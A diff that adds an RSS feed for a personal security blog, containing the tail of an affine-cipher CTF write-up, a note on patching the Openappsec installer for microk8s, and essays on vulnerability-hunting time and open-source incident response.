+&lt;h1 id=&quot;how-do-we-crack-it&quot;&gt;How do we crack it?&lt;/h1&gt;
+&lt;p&gt;I’ll be honest, I didn’t really do a lot of research here trying to understand how to manually crack it.  More googling showed that it’s known to be pretty easily brute-forced.  I love the &lt;a href=&quot;https://www.decode.fr/&quot;&gt;decode.fr&lt;/a&gt; site for these types of things.  They do have an &lt;a href=&quot;https://www.decode.fr/affine-cipher/&quot;&gt;affine cipher brute-forcing tool&lt;/a&gt;.  I plugged the input into that, and it presented a wide variety of results based on the values of A/B.  The first one it found looked to be the flag:
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/assets/img/posts/ritsec-ctf-2023/a-fine-cipher/bfed.png&quot; alt=&quot;decode.fr results&quot; title=&quot;Results from decode.fr's brute-force tool&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h1&gt;
+&lt;p&gt;I didn’t do myself any favors by plugging this into a tool without learning more about it, but it does seem that like this is a very “CTF” type of challenge, as I haven’t ever seen AFFine Ciphers used in the wild.  While it’s possible, it’s extremely uncommon and trivial to crack.&lt;/p&gt;
+</description>
+        <pubDate>Sun, 02 Apr 2023 04:00:00 +0000</pubDate>
+        <link>/blog/ritsec-ctf-2023/crypto/a-fine-cipher</link>
+        <guid isPermaLink="true">/blog/ritsec-ctf-2023/crypto/a-fine-cipher</guid>
+      </item>
+    
+      <item>
+        <title>Openappsec on Microk8s</title>
+        <description>&lt;h1 id=&quot;tldr&quot;&gt;TLDR&lt;/h1&gt;
+&lt;p&gt;This expirement didn’t work out, it appears to not work &lt;em&gt;as of the time of writing&lt;/em&gt;.  Always check with the source, as things could have changed!&lt;/p&gt;
+
+&lt;h1 id=&quot;what-are-these-words&quot;&gt;What are these words?&lt;/h1&gt;
+&lt;p&gt;Openappsec is a Web Application Firewall (WAF) that is still in beta, and Microk8s is a lightweight kubernetes platform that isn’t &lt;em&gt;often&lt;/em&gt; used for production deployments.  I am lazy and rely on microk8s for little VMs to do lots of work for me.  I also wanted to play with the new shiny toy on the market for WAFs. So while this is potentially an unusual scenario, it’s very possible that there are others exploring this combination for testing.&lt;/p&gt;
+
+&lt;p&gt;Openappsec looks like a very promising product, and they even have some nice little install utilities.  Unfortunately, those utilities do not work (yet) on microk8s.&lt;/p&gt;
+
+&lt;h1 id=&quot;note-on-wafs&quot;&gt;Note on WAFs&lt;/h1&gt;
+&lt;p&gt;WAFs can be a good part of an overall security program, but they are definitely not a silver bullet.  From my experience, they are most useful for preventing a lot of the botnet activity, and they may annoy your drive-by script-kiddy &lt;em&gt;just enough&lt;/em&gt; to convince them to move onto the next target.  Just about any rule you can configure in a WAF can be bypassed by a good enough attacker.&lt;/p&gt;
+
+&lt;h1 id=&quot;installing-openappsec-on-microk8s&quot;&gt;Installing Openappsec on Microk8s&lt;/h1&gt;
+&lt;h2 id=&quot;prerequisites&quot;&gt;Prerequisites&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;jq&lt;/li&gt;
+  &lt;li&gt;yq&lt;/li&gt;
+  &lt;li&gt;helm&lt;/li&gt;
+  &lt;li&gt;microk8s&lt;/li&gt;
+  &lt;li&gt;microk8s ingress addon enabled (you may also want DNS or other addons)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;modifying-the-quick-start-script&quot;&gt;Modifying the quick-start script:&lt;/h2&gt;
+&lt;p&gt;From &lt;a href=&quot;https://docs.openappsec.io/getting-started/start-with-kubernetes/install-using-interactive-cli-tool-ingress-nginx&quot;&gt;Openappsec’s Documentation&lt;/a&gt;, you can download their setup script and execute it to install openappsec on an existing kubernetes cluster with an nginx ingress.&lt;/p&gt;
+
+&lt;p&gt;Microk8s uses nginx as their ingress controller, but for whatever reason, the class name is not &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx&lt;/code&gt;, it’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;public&lt;/code&gt;.  I haven’t done enough research to understand why.&lt;/p&gt;
+
+&lt;p&gt;If you run the script from https://downloads.openappsec.io/open-appsec-k8s-install, you will get an error telling you that your ingress is not currently supported.&lt;/p&gt;
+
+&lt;p&gt;If you modify the script (at the time of writing, it’s on line 185), you can tell it to continue with your microk8s ingress.  Change the grep to be the following:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if ! grep -qE &quot;ingressClassName: (nginx|public)&quot; ingress.yaml.tmp  ; then
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Run this again, and it should be good to go!&lt;/p&gt;
+
+&lt;h1 id=&quot;closing-thoughts&quot;&gt;Closing Thoughts&lt;/h1&gt;
+&lt;p&gt;I am writing this before I forget, and haven’t really played with openappsec yet.  I’m not even 100% confident that it’s going to work perfectly with microk8s, though I do see some events in the logs!  Hopefully I will have more time to continue evaluating it and can write up a more detailed review at a later date.&lt;/p&gt;
+</description>
+        <pubDate>Tue, 07 Mar 2023 04:00:00 +0000</pubDate>
+        <link>/blog/openappsec-on-microk8s/</link>
+        <guid isPermaLink="true">/blog/openappsec-on-microk8s/</guid>
+      </item>
+    
+      <item>
+        <title>Chasing Squirrels vs Hunting</title>
+        <description>&lt;h1 id=&quot;chasing-squirrels-vs-hunting&quot;&gt;Chasing Squirrels vs Hunting&lt;/h1&gt;
+&lt;p&gt;I spend most of my day being wrong about things.  I’ve not only accepted this, I’ve learned to embrace it.  When my assumptions are challenged or new information is presented, I’m able to learn and understand more.  In many ways, being wrong is a &lt;em&gt;beautiful&lt;/em&gt; thing.&lt;/p&gt;
+
+&lt;p&gt;“Chasing squirrels” refers to spending time on something that is insignificant.  I have to wear a lot of hats at my job, and it’s part of my responsibility to be spending time in ways that add value to the organization: chasing squirrels, by definition, does not add value.&lt;/p&gt;
+
+&lt;p&gt;You can probably see the flaw in my logic: I shouldn’t waste time chasing squirrels, AND I’m frequently wrong about things.  What if it isn’t a squirrel I’m chasing?&lt;/p&gt;
+
+&lt;h2 id=&quot;story-time&quot;&gt;Story Time!&lt;/h2&gt;
+&lt;p&gt;I realized that I didn’t know a lot about a particular class of vulnerability, and I wanted to do better. I read some articles and cheat-sheets, then played a couple retired &lt;a href=&quot;https://www.hackthebox.eu/&quot;&gt;HackTheBox&lt;/a&gt; machines featuring this type of vulnerability.  (I have no affiliation to HTB, I just think it’s an awesome learning tool!) I was excited about what I just learned, and set out on a mission to find this type of vulnerability at work.&lt;/p&gt;
+
+&lt;p&gt;I had a “gut feeling” about a feature in the application so I started there.  I set a one hour time-limit for myself - if I didn’t find anything after an hour, I would move on to my other tasks.  After about 45 minutes, I found evidence that the application was vulnerable to this type of attack. The evidence was pretty weak and the impact was insignificant, but it was a starting point.&lt;/p&gt;
+
+&lt;p&gt;At this point, I was thinking that this may be a “squirrel”.  There were multiple compensating controls in place, and I couldn’t do anything particularly malicious with the finding.  I decided to continue exploring it though: I was learning some neat things, and I had at least a &lt;em&gt;little&lt;/em&gt; evidence that something bigger may be hidden underneath.&lt;/p&gt;
+
+&lt;p&gt;After researching the compensating controls, I started theorizing potential bypasses.  A few hours later, I had a handful of unrelated vulnerabilities that, when chained together, allowed me to bypass all of them. At this point, I was able to polish my proof-of-concept and begin the process of working with our teams to get it remediated.&lt;/p&gt;
+
+&lt;p&gt;I won’t be providing specific details, but there were at least 6 findings, including one that is in a third-party library.  This vulnerability was reported to the maintainers years ago, and was closed as “not an issue”. Not having known CVEs in your dependencies does not mean “secure”.  All in, my investigation took about 6 hours.  Attackers don’t always work with the same time-frames that we defenders do: they can take as much time as they need to find an attack vector and exploit it. This is what makes it hard for me to know when I’m chasing squirrels vs &lt;em&gt;actually&lt;/em&gt; hunting.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-is-a-squirrel&quot;&gt;What Is a Squirrel?&lt;/h2&gt;
+&lt;p&gt;I like to ask myself the following questions when I think I may be chasing a squirrel:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Am I gaining knowledge/skills?&lt;/li&gt;
+  &lt;li&gt;Is this knowledge transferrable to other areas?&lt;/li&gt;
+  &lt;li&gt;Are my actions making things more secure?&lt;/li&gt;
+  &lt;li&gt;What is the impact if an attacker with more time was able to exploit this?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;If you’ve answered “yes” to at least two of these questions, it’s probably not a squirrel.  I tend to apply this to my own personal research as well.  Is it the right way?  Well… We’ve established my track record for being “right” about things, so probably not.  It has, however, been working well for me.  I find it’s provided a great balance between getting my work done and advancing my skill-set/career.&lt;/p&gt;
+
+&lt;p&gt;Even after all of that, yes, I sometimes chase squirrels.  It &lt;em&gt;is&lt;/em&gt; worth it to chase squirrels sometimes.  Feeling like you wasted your time on something helps you build your intuition.  Learn to be wrong, love to be wrong, and most importantly - act like a dog and chase a squirrel every now and then. You may never catch it, but you’ll have fun while doing it!&lt;/p&gt;
+</description>
+        <pubDate>Fri, 10 Jun 2022 00:00:00 +0000</pubDate>
+        <link>/blog/chasing-squirrels-vs-hunting/</link>
+        <guid isPermaLink="true">/blog/chasing-squirrels-vs-hunting/</guid>
+      </item>
+    
+      <item>
+        <title>Incident Response in Open Source</title>
+        <description>&lt;p&gt;A part of my current day job is responding to security incidents.  In my free time, I contribute to some open-source work, namely &lt;a href=&quot;https://www.github.com/owasp/threat-dragon&quot;&gt;OWASP Threat Dragon&lt;/a&gt;.  Threat Dragon hosts a demo instance on a small Heroku plan so that people can see it before going through the effort of downloading it or setting up a self-hosted instance.&lt;/p&gt;
+
+&lt;h2 id=&quot;the-incident&quot;&gt;The Incident&lt;/h2&gt;
+&lt;p&gt;Heroku had a pretty serious &lt;a href=&quot;https://status.heroku.com/incidents/2413&quot;&gt;security incident&lt;/a&gt;.  I received an email about this late at night, Friday, on a holiday weekend.  There weren’t many details at the time, so I pinged Threat Dragon’s other maintainer to notify him as well.  The next morning, more details were available, and it appeared that Threat Dragon was not impacted by this incident.  By Sunday night, I had some time to truly investigate and take additional proactive/corrective action to ensure the safety and security of our community.&lt;/p&gt;
+
+&lt;p&gt;Heroku is owned by Salesforce, and the Salesforce security team did a wonderful job of handling this incident.  I love that they notified all of their customers once they were aware of such a serious incident.  Additionally, the writeup and level of detail on their public status page was wonderful. They provided clear steps to identify if you were impacted as well as how to search for indicators of compromise. This truly shows the maturity of their security/incident response teams.  I think it’s worth noting that it was handled well, and the intent of this article is not to criticize the handling of the incident.&lt;/p&gt;
+
+&lt;h2 id=&quot;am-i-an-open-source-incident-responder&quot;&gt;Am I an Open-Source Incident Responder?&lt;/h2&gt;
+&lt;p&gt;I’m used to responding to incidents that involve the company I work for, and do so according to their policies, procedures and reporting structure.  It’s pretty common to have a &lt;a href=&quot;https://docs.github.com/en/code-security/getting-started/adding-a-security-policy-to-your-repository&quot;&gt;Security Policy&lt;/a&gt; in open-source projects, but it doesn’t typically cover incident response: Who is responsible, how/when is it reported, what tools/processes are at our disposal, etc.  This isn’t scalable or even attainable for a community of volunteers. But does this mean we shouldn’t have &lt;em&gt;any&lt;/em&gt; kind of incident response process?&lt;/p&gt;
+
+&lt;p&gt;If my day-job had a potential security incident of this magnitude, I would have been working all weekend (or at least until it was remediated).  Open source isn’t my full-time job, so I find myself less willing to give up my family/social commitments.  To be clear: I take the security of projects I contribute to seriously - I just don’t feel obligated to immediately respond in the same way that I do with my full-time job. When I had some free time that Sunday night, I really dug in and found myself falling into my “incident response” groove.  It felt natural, and it felt like the right thing to do.&lt;/p&gt;
+
+&lt;p&gt;I felt conflicted for putting this off for a couple days while I spent time with my family.  As a maintainer, I &lt;em&gt;am responsible&lt;/em&gt; for the security of the project. The community contributions are outstanding, and often times include security updates. My role as a maintainer isn’t to be the sole security engineer, but that doesn’t mean I’m not &lt;em&gt;responsible&lt;/em&gt; for the security. The community trusts Threat Dragon, and we need to continue to actively earn that trust. I decided that this would be a priority for me when I had free-time to work on it, as opposed to &lt;em&gt;making&lt;/em&gt; the time.  This felt like a reasonable compromise for me, though I’m curious how others would feel about this.&lt;/p&gt;
+
+&lt;h2 id=&quot;who-is-this-for&quot;&gt;Who is this for?&lt;/h2&gt;
+&lt;p&gt;I don’t think that every open-source project really needs incident response.  A project would probably need one of the following to see any benefit:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;Publicly hosted instance/service&lt;/li&gt;
+  &lt;li&gt;Collection/processing of any data, with an emphasis on PII&lt;/li&gt;
+  &lt;li&gt;Auth tokens / auth mechanisms (even simple logins, users do re-use passwords!)&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We’ve come a long way with responsible disclosure and timely remediation, especially in the open-source communities.  For projects where incident response may be appropriate, this could be a great way of building trust in your community as well as showing a strong commitment to the security of the project.&lt;/p&gt;
+
+&lt;h2 id=&quot;what-are-you-proposing&quot;&gt;What Are You Proposing?&lt;/h2&gt;
+&lt;p&gt;I have already &lt;a href=&quot;https://github.com/OWASP/threat-dragon/issues/419&quot;&gt;proposed this&lt;/a&gt; to the Threat Dragon community, and am curious what the feedback will be.  This will be centered around GitHub’s features specifically, but could be easily adapted to any source control or ticketing system.
+###&lt;/p&gt;
+&lt;h4 id=&quot;incidents-vs-vulnerabilities&quot;&gt;Incidents vs Vulnerabilities&lt;/h4&gt;
+&lt;p&gt;For this discussion, I consider Incidents as a security weakness that has been exploited, such as a data breach.  This often centers around infrastructure and data. Vulnerabilities are bugs in first/third-party software which makes the code vulnerable to attack/exploitation.&lt;/p&gt;
+
+&lt;h4 id=&quot;incident-response&quot;&gt;Incident Response&lt;/h4&gt;
+&lt;ul&gt;
+  &lt;li&gt;Repositories / organizations should define a tag to be used for issues that describe security incidents&lt;/li&gt;
+  &lt;li&gt;An issue should be created with the incident tag &lt;strong&gt;only after it does not increase risk for the community to discuss it publicly&lt;/strong&gt;&lt;/li&gt;
+  &lt;li&gt;Include the following in the issue:
+    &lt;ul&gt;
+      &lt;li&gt;TLDR
+        &lt;ul&gt;
+          &lt;li&gt;Not everyone will want to read the whole write-up.  This should tell users if they need to take action, or how to quickly determine if they’re impacted&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Summary
+        &lt;ul&gt;
+          &lt;li&gt;A high-level overview of what the issue was, who was impacted, and the duration of the incident&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Timeline
+        &lt;ul&gt;
+          &lt;li&gt;A timeline of events starting with incident discovery, what steps were taken to investigate, and any corrective action&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;References
+        &lt;ul&gt;
+          &lt;li&gt;Include helpful references/resources&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+      &lt;li&gt;Evidence (Optional)
+        &lt;ul&gt;
+          &lt;li&gt;Include screenshots or evidence, but &lt;em&gt;only if it does not contain user data or secrets&lt;/em&gt;&lt;/li&gt;
+        &lt;/ul&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;The issue should be pinned until it is no longer relevant to the community or at least 3 days after it is resolved&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h4 id=&quot;why&quot;&gt;Why?&lt;/h4&gt;
+&lt;p&gt;Everyone &lt;em&gt;claims&lt;/em&gt; that they take security seriously, but words are cheap.  Let’s have our actions do the talking.  This is a level of transparency that may be new or even uncomfortable for some.  There are compliance/legal reasons as to why corporations may not share this type of information, or even pressure from the c-suite / board.  In open-source, we do not operate within those constraints.  Our community is our board of trustees, and I’ve heard them clearly articulate that they want transparency and better security.  Publicly handling real or potential incidents is a step toward that goal, and if adopted in open-source, could eventually influence corporations.&lt;/p&gt;
+
+&lt;h2 id=&quot;how-is-this-different-from-githubs-security-advisories&quot;&gt;How is This Different From GitHub’s Security Advisories?&lt;/h2&gt;
+&lt;p&gt;&lt;a href=&quot;https://docs.github.com/en/code-security/repository-security-advisories/about-coordinated-disclosure-of-security-vulnerabilities#about-reporting-and-disclosing-vulnerabilities-in-projects-on-github&quot;&gt;GitHub’s security advisories&lt;/a&gt; do a great job of sharing vulnerabilities that existed in different versions of software. This does not cover transient incidents involving upstream providers, like the example above.  I do understand that what I’m discussing is an edge-case, and may not be helpful for all projects either!  I also feel very strongly that we should have a process in place to guide us when it does happen, and ensure we are prepared.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;Unless an open-source project has a large company supporting it, there will likely never be an “incident response team” on standby.  That doesn’t mean we can’t do better with transparently handling potential/real security incidents in open-source.  We should promote a security culture where end-users are aware of and in control of their data, privacy, and security.  By being transparent with how these situations are handled, we will benefit from the collective knowledge of the community and develop better processes and controls.&lt;/p&gt;
+
+&lt;p&gt;I don’t proclaim to be the most knowledgeable security practitioner out there: I’m still learning. Maybe this isn’t the way forward, maybe there are &lt;em&gt;better&lt;/em&gt; ways of doing this - what’s important is that it’s discussed openly.  My hope is that one day, as a community, we come to a consensus of how to best handle security incidents for open-source projects.&lt;/p&gt;
+
+&lt;p&gt;If you contribute to an open-source project, consider what you might do to help investigate a potential security incident - would this type of incident handling be beneficial for your community?  If you have any thoughts or want to follow the discussion, swing by the &lt;a href=&quot;https://github.com/OWASP/threat-dragon/issues/419&quot;&gt;issue on Threat Dragon’s GitHub&lt;/a&gt; to discuss it!&lt;/p&gt;
+</description>
+        <pubDate>Mon, 18 Apr 2022 00:00:00 +0000</pubDate>
+        <link>/blog/incident-response-in-open-source/</link>
+        <guid isPermaLink="true">/blog/incident-response-in-open-source/</guid>
+      </item>
+    
+      <item>
+        <title>Welcome to my new site!</title>
+        <description>&lt;p&gt;It’s been a long time since I’ve maintained a blog, and I wanted to start one again.  I find blogging about things I find interesting to be helpful, specifically when it’s something challenging, like security concepts, tools, exploits, etc.&lt;/p&gt;
+
+&lt;p&gt;My hope is that I can share some of my experiences with the greater security community, and hopefully with a focus on defense.  While it’s gotten better in recent years, I feel like blue-teaming just isn’t as sexy as red-teaming, and doesn’t get the attention that it &lt;em&gt;needs&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;If you’re seeing this, thanks for reading!  If It’s been more than a week or two since I posted this initial post, please do drop me a line: keep me honest!&lt;/p&gt;
+</description>
+        <pubDate>Thu, 14 Apr 2022 06:00:00 +0000</pubDate>
+        <link>/blog/welcome-to-my-site/</link>
+        <guid isPermaLink="true">/blog/welcome-to-my-site/</guid>
+      </item>
+    
+
+    
+      
+        
+      
+    
+      
+    
+      
+        
+          <item>
+            <title></title>
+            <description>&lt;h3&gt;   &lt;/h3&gt;
+
+&lt;div id=&quot;categories&quot;&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#hobbies&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/hobbies&quot;&gt;hobbies&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;hobbies&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/welcome-to-my-site/&quot;&gt;Welcome to my new site!&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#security&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/security&quot;&gt;security&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;security&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/openappsec-on-microk8s/&quot;&gt;Openappsec on Microk8s&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/chasing-squirrels-vs-hunting/&quot;&gt;Chasing Squirrels vs Hunting&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/incident-response-in-open-source/&quot;&gt;Incident Response in Open Source&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+  &lt;div class=&quot;category-box&quot;&gt;
+    
+    &lt;div id=&quot;#ritsec-ctf-2023&quot;&gt;&lt;/div&gt;
+    &lt;h4 class=&quot;category-head&quot;&gt;&lt;a href=&quot;/blog/categories/ritsec-ctf-2023&quot;&gt;ritsec-ctf-2023&lt;/a&gt;&lt;/h4&gt;
+    &lt;a name=&quot;ritsec-ctf-2023&quot;&gt;&lt;/a&gt;
+     
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/web/x-men-lore&quot;&gt;RITSEC 2023 - Web / X-Men Lore&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/web/rick-roll&quot;&gt;RITSEC 2023 - Web / Rick Roll&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-4&quot;&gt;RITSEC 2023 - Forensics / Red Team Activity 4&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-3&quot;&gt;RITSEC 2023 - Forensics / Red Team Activity 3&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-2&quot;&gt;RITSEC 2023 - Forensics / Red Team Activity 2&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/forensics/red-team-activity-1&quot;&gt;RITSEC 2023 - Forensics / Red Team Activity 1&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/web/pickle-store&quot;&gt;RITSEC 2023 - Web / Pickle Store&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/misc/new-hire&quot;&gt;RITSEC 2023 - Misc / New Hire&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/crypto/either-or-neither-nor&quot;&gt;RITSEC 2023 - Crypto / Either or Neither nor&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/web/echoes&quot;&gt;RITSEC 2023 - Web / Echoes&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/misc/connection-terminated&quot;&gt;RITSEC 2023 - Misc / Connection Terminated&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/web/broken-bot&quot;&gt;RITSEC 2023 - Web / Broken Bot&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+    &lt;article class=&quot;center&quot;&gt;
+      &lt;h6&gt;&lt;a href=&quot;/blog/ritsec-ctf-2023/crypto/a-fine-cipher&quot;&gt;RITSEC 2023 - Crypto / A Fine Cipher Writeup&lt;/a&gt;&lt;/h6&gt;
+    &lt;/article&gt;
+
+
+    
+
+  &lt;/div&gt;
+
+&lt;/div&gt;
+
+</description>
+            <link>/blog/categories/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>Hobbies</title>
+            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;
+
+&lt;div class=&quot;card&quot;&gt;
+{% for post in site.categories.hobbies %}
+ &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
+{% endfor %}
+&lt;/div&gt;</description>
+            <link>/blog/categories/hobbies/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+        
+          <item>
+            <title>RITSEC CTF 2023</title>
+            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;
+
+&lt;div class=&quot;card&quot;&gt;
+{% for post in site.categories.ritsec-ctf-2023 %}
+ &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
+{% endfor %}
+&lt;/div&gt;</description>
+            <link>/blog/categories/ritsec-ctf-2023/</link>
+          </item>
+        
+      
+    
+      
+        
+          <item>
+            <title>Security</title>
+            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;
+
+&lt;div class=&quot;card&quot;&gt;
+{% for post in site.categories.security %}
+ &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
+{% endfor %}
+&lt;/div&gt;</description>
+            <link>/blog/categories/security/</link>
+          </item>
+        
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+
+  </channel>
+</rss>
